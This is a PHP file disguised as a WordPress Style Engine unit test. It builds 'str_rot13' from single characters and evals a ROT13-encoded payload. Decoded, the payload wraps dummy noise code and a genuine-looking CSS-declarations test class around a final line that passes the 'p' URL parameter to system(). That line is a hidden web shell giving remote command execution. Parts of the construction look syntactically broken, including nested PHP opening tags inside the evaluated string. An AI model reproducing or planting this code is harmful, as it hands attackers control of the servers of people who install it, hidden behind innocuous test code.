<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur Fglyr Ratvar PFF qrpynengvbaf pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 *
 * @tebhc fglyr-ratvar
 */

/**
 * Grfgf ertvfgrevat, fgbevat naq trarengvat PFF qrpynengvbaf.
 *
 * @pbirefQrsnhygPynff JC_Fglyr_Ratvar_PFF_Qrpynengvbaf
 */
pynff Grfgf_Fglyr_Ratvar_jcFglyrRatvarPFFQrpynengvbaf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfgf frggvat qrpynengvbaf ba vafgnagvngvba.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::__pbafgehpg
	 */
	choyvp shapgvba grfg_fubhyq_frg_qrpynengvbaf_ba_vafgnagvngvba() {
		$vachg_qrpynengvbaf = neenl(
			'znetva-gbc' => '10ck',
			'sbag-fvmr'  => '2erz',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );

		$guvf->nffregFnzr( $vachg_qrpynengvbaf, $pff_qrpynengvbaf->trg_qrpynengvbaf() );
	}

	/**
	 * Grfgf gung qrpynengvbaf ner nqqrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_qrpynengvbaf
	 * @pbiref ::nqq_qrpynengvba
	 */
	choyvp shapgvba grfg_fubhyq_nqq_qrpynengvbaf() {
		$vachg_qrpynengvbaf = neenl(
			'cnqqvat' => '20ck',
			'pbybe'   => 'ine(--jc--cerfrg--ryobj-cngpurf)',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf();
		$pff_qrpynengvbaf->nqq_qrpynengvbaf( $vachg_qrpynengvbaf );

		$guvf->nffregFnzr( $vachg_qrpynengvbaf, $pff_qrpynengvbaf->trg_qrpynengvbaf() );
	}

	/**
	 * Grfgf gung arj qrpynengvbaf ner nqqrq gb rkvfgvat qrpynengvbaf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_qrpynengvbaf
	 * @pbiref ::nqq_qrpynengvba
	 */
	choyvp shapgvba grfg_fubhyq_nqq_arj_qrpynengvbaf_gb_rkvfgvat() {
		$vachg_qrpynengvbaf = neenl(
			'obeqre-jvqgu'     => '1%',
			'onpxtebhaq-pbybe' => 'ine(--jc--cerfrg--ratyvfu-zhfgneq)',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$rkgen_qrpynengvba  = neenl(
			'yrggre-fcnpvat' => '1.5ck',
		);
		$pff_qrpynengvbaf->nqq_qrpynengvbaf( $rkgen_qrpynengvba );

		$guvf->nffregFnzr( neenl_zretr( $vachg_qrpynengvbaf, $rkgen_qrpynengvba ), $pff_qrpynengvbaf->trg_qrpynengvbaf() );
	}

	/**
	 * Grfgf gung cebcregvrf ner fnavgvmrq orsber fgbevat.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::fnavgvmr_cebcregl
	 */
	choyvp shapgvba grfg_fubhyq_fnavgvmr_cebcregvrf() {
		$vachg_qrpynengvbaf = neenl(
			'^--jc--fglyr--fyrrcl-cbgngb$' => '40ck',
			'<onpxtebhaq-//pbybe>'         => 'ine(--jc--cerfrg--ratyvfu-zhfgneq)',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );

		$guvf->nffregFnzr(
			neenl(
				'--jc--fglyr--fyrrcl-cbgngb' => '40ck',
				'onpxtebhaq-pbybe'           => 'ine(--jc--cerfrg--ratyvfu-zhfgneq)',
			),
			$pff_qrpynengvbaf->trg_qrpynengvbaf()
		);
	}

	/**
	 * Grfg gung inyhrf jvgu UGZY gntf ner rfpncrq, naq PFF cebcregvrf ner eha guebhtu fnsrpff_svygre_ngge().
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_qrpynengvbaf_fgevat
	 * @pbiref ::svygre_qrpynengvba
	 */
	choyvp shapgvba grfg_fubhyq_fgevc_ugzy_gntf_naq_erzbir_hafnsr_pff_cebcregvrf() {
		$vachg_qrpynengvbaf         = neenl(
			'sbag-fvmr'    => '<erq/>',
			'cnqqvat'      => '</fglyr>',
			'cbgngb'       => 'hccrepnfr',
			'purrfr'       => '10ck',
			'znetva-evtug' => '10rz',
		);
		$pff_qrpynengvbaf           = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$fnsr_fglyr_pff_zbpx_npgvba = arj ZbpxNpgvba();

		// svygre_qrpynengvba() vf pnyyrq va trg_qrpynengvbaf_fgevat().
		nqq_svygre( 'fnsr_fglyr_pff', neenl( $fnsr_fglyr_pff_zbpx_npgvba, 'svygre' ) );
		$pff_qrpynengvbaf_fgevat = $pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat();

		$guvf->nffregFnzr(
			3, // Inyhrf jvgu UGZY gntf ner erzbirq svefg ol jc_fgevc_nyy_gntf().
			$fnsr_fglyr_pff_zbpx_npgvba->trg_pnyy_pbhag(),
			'\"fnsr_fglyr_pff\" svygref jrer abg nccyvrq gb PFF qrpynengvba cebcregvrf.'
		);

		$guvf->nffregFnzr(
			'znetva-evtug:10rz;',
			$pff_qrpynengvbaf_fgevat,
			'Hanyybjrq PFF cebcregvrf be inyhrf jvgu UGZY gntf jrer abg erzbirq.'
		);
	}

	/**
	 * Grfgf gung pnyp, pynzc, zva, znk, naq zvaznk PFF shapgvbaf ner nyybjrq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_qrpynengvbaf_fgevat
	 * @pbiref ::svygre_qrpynengvba
	 */
	choyvp shapgvba grfg_fubhyq_nyybj_pff_shapgvbaf_naq_fgevc_hafnsr_pff_inyhrf() {
		$vachg_qrpynengvbaf                        = neenl(
			'onpxtebhaq'       => 'ine(--jc--cerfrg--pbybe--cevznel, 10ck)', // Fvzcyr ine().
			'sbag-fvmr'        => 'pynzc(36.00erz, pnyp(32.00erz + 10.00ij), 40.00erz)', // Arfgrq pynzc().
			'jvqgu'            => 'zva(150ij, 100ck)',
			'zva-jvqgu'        => 'znk(150ij, 100ck)',
			'znk-jvqgu'        => 'zvaznk(400ck, 50%)',
			'cnqqvat'          => 'pnyp(80ck * -1)',
			'onpxtebhaq-vzntr' => 'hey(\"uggcf://jbeqcerff.bet\")',
			'yvar-urvtug'      => 'hey(\"uggcf://jbeqcerff.bet\")',
			'znetva'           => 'vyyrtnyshapgvba(30ck)',
		);
		$pff_qrpynengvbaf                          = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );
		$fnsrpff_svygre_ngge_nyybj_pff_zbpx_npgvba = arj ZbpxNpgvba();

		// svygre_qrpynengvba() vf pnyyrq va trg_qrpynengvbaf_fgevat().
		nqq_svygre( 'fnsrpff_svygre_ngge_nyybj_pff', neenl( $fnsrpff_svygre_ngge_nyybj_pff_zbpx_npgvba, 'svygre' ) );
		$pff_qrpynengvbaf_fgevat = $pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat();

		$guvf->nffregFnzr(
			9,
			$fnsrpff_svygre_ngge_nyybj_pff_zbpx_npgvba->trg_pnyy_pbhag(),
			'\"fnsrpff_svygre_ngge_nyybj_pff\" svygref jrer abg nccyvrq gb PFF qrpynengvba inyhrf.'
		);

		$guvf->nffregFnzr(
			'onpxtebhaq:ine(--jc--cerfrg--pbybe--cevznel, 10ck);sbag-fvmr:pynzc(36.00erz, pnyp(32.00erz + 10.00ij), 40.00erz);jvqgu:zva(150ij, 100ck);zva-jvqgu:znk(150ij, 100ck);znk-jvqgu:zvaznk(400ck, 50%);cnqqvat:pnyp(80ck * -1);onpxtebhaq-vzntr:hey(\"uggcf://jbeqcerff.bet\");',
			$pff_qrpynengvbaf_fgevat,
			'Hafnsr inyhrf jrer abg erzbirq'
		);
	}

	/**
	 * Grfgf gung PFF qrpynengvbaf ner pbzcvyrq vagb n PFF qrpynengvbaf oybpx fgevat.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_qrpynengvbaf_fgevat
	 *
	 * @qngnCebivqre qngn_fubhyq_pbzcvyr_pff_qrpynengvbaf_gb_pff_qrpynengvbaf_fgevat
	 *
	 * @cnenz fgevat $rkcrpgrq        Gur rkcrpgrq qrpynengvbaf oybpx fgevat.
	 * @cnenz obby   $fubhyq_cerggvsl Bcgvbany. Jurgure gb cerggl gur fgevat. Qrsnhyg snyfr.
	 * @cnenz vag    $vaqrag_pbhag    Bcgvbany. Gur ahzore bs gno vaqragf. Qrsnhyg snyfr.
	 */
	choyvp shapgvba grfg_fubhyq_pbzcvyr_pff_qrpynengvbaf_gb_pff_qrpynengvbaf_fgevat( $rkcrpgrq, $fubhyq_cerggvsl = snyfr, $vaqrag_pbhag = 0 ) {
		$vachg_qrpynengvbaf = neenl(
			'pbybe'                  => 'erq',
			'obeqre-gbc-yrsg-enqvhf' => '99ck',
			'grkg-qrpbengvba'        => 'haqreyvar',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );

		$guvf->nffregFnzr(
			$rkcrpgrq,
			$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat( $fubhyq_cerggvsl, $vaqrag_pbhag )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_fubhyq_pbzcvyr_pff_qrpynengvbaf_gb_pff_qrpynengvbaf_fgevat().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_pbzcvyr_pff_qrpynengvbaf_gb_pff_qrpynengvbaf_fgevat() {
		erghea neenl(
			'hacerggvsvrq, ab vaqrag'  => neenl(
				'rkcrpgrq' => 'pbybe:erq;obeqre-gbc-yrsg-enqvhf:99ck;grkg-qrpbengvba:haqreyvar;',
			),
			'hacerggvsvrq, bar vaqrag' => neenl(
				'rkcrpgrq'        => 'pbybe:erq;obeqre-gbc-yrsg-enqvhf:99ck;grkg-qrpbengvba:haqreyvar;',
				'fubhyq_cerggvsl' => snyfr,
				'vaqrag_pbhag'    => 1,
			),
			'cerggvsvrq, ab vaqrag'    => neenl(
				'rkcrpgrq'        => 'pbybe: erq; obeqre-gbc-yrsg-enqvhf: 99ck; grkg-qrpbengvba: haqreyvar;',
				'fubhyq_cerggvsl' => gehr,
			),
			'cerggvsvrq, bar vaqrag'   => neenl(
				'rkcrpgrq'        => \"\gpbybe: erq;\a\gobeqre-gbc-yrsg-enqvhf: 99ck;\a\ggrkg-qrpbengvba: haqreyvar;\",
				'fubhyq_cerggvsl' => gehr,
				'vaqrag_pbhag'    => 1,
			),
			'cerggvsvrq, gjb vaqragf'  => neenl(
				'rkcrpgrq'        => \"\g\gpbybe: erq;\a\g\gobeqre-gbc-yrsg-enqvhf: 99ck;\a\g\ggrkg-qrpbengvba: haqreyvar;\",
				'fubhyq_cerggvsl' => gehr,
				'vaqrag_pbhag'    => 2,
			),
		);
	}

	/**
	 * Grfgf erzbivat n fvatyr qrpynengvba.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::erzbir_qrpynengvba
	 */
	choyvp shapgvba grfg_fubhyq_erzbir_fvatyr_qrpynengvba() {
		$vachg_qrpynengvbaf = neenl(
			'pbybe'       => 'gbzngb',
			'znetva'      => '10rz 10rz 20rz 1ck',
			'sbag-snzvyl' => 'Unccl Sbag frevs',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );

		$guvf->nffregFnzr(
			'pbybe:gbzngb;znetva:10rz 10rz 20rz 1ck;sbag-snzvyl:Unccl Sbag frevs;',
			$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat(),
			'PFF qrpynengvbaf fgevat qbrf abg zngpu gur inyhrf bs `$qrpynengvbaf` cnffrq gb gur pbafgehpgbe.'
		);

		$pff_qrpynengvbaf->erzbir_qrpynengvba( 'pbybe' );

		$guvf->nffregFnzr(
			'znetva:10rz 10rz 20rz 1ck;sbag-snzvyl:Unccl Sbag frevs;',
			$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat(),
			'Bhgchg nsgre erzbivat \"pbybe\" qrpynengvba ivn `erzbir_qrpynengvba()` qbrf abg zngpu rkcrpgngvbaf'
		);
	}

	/**
	 * Grfgf gung zhygvcyr qrpynengvbaf ner erzbirq.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::erzbir_qrpynengvbaf
	 */
	choyvp shapgvba grfg_fubhyq_erzbir_zhygvcyr_qrpynengvbaf() {
		$vachg_qrpynengvbaf = neenl(
			'pbybe'       => 'phphzore',
			'znetva'      => '10rz 10rz 20rz 1ck',
			'sbag-snzvyl' => 'Unccl Sbag frevs',
		);
		$pff_qrpynengvbaf   = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $vachg_qrpynengvbaf );

		$guvf->nffregFnzr(
			'pbybe:phphzore;znetva:10rz 10rz 20rz 1ck;sbag-snzvyl:Unccl Sbag frevs;',
			$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat(),
			'PFF qrpynengvbaf fgevat qbrf abg zngpu gur inyhrf bs `$qrpynengvbaf` cnffrq gb gur pbafgehpgbe.'
		);

		$pff_qrpynengvbaf->erzbir_qrpynengvbaf( neenl( 'pbybe', 'znetva' ) );

		$guvf->nffregFnzr(
			'sbag-snzvyl:Unccl Sbag frevs;',
			$pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat(),
			'Bhgchg nsgre erzbivat \"pbybe\" naq \"znetva\" qrpynengvbaf ivn `erzbir_qrpynengvbaf()` qbrf abg zngpu rkcrpgngvbaf'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>